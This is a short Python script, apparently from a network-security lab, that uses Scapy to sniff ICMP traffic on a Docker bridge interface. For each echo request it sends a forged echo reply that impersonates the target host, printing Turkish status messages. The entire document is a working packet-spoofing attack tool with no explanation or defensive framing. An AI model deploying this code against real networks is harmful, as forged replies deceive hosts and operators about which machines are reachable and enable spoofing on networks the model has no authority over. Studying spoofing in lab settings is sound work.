#!/usr/bin/env python3
from scapy.all import *

def spoof_reply(pkt):
    if ICMP in pkt and pkt[ICMP].type == 8:
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
        data = pkt[Raw].load if Raw in pkt else b""
        send(ip/icmp/data, verbose=0, iface="br-90fe1db80792")  # iface eklendi
        print(f"İstek yakalandı: {pkt[IP].src} → {pkt[IP].dst}")
        print(f"Sahte cevap gönderildi!")

sniff(iface="br-90fe1db80792", filter="icmp", prn=spoof_reply)

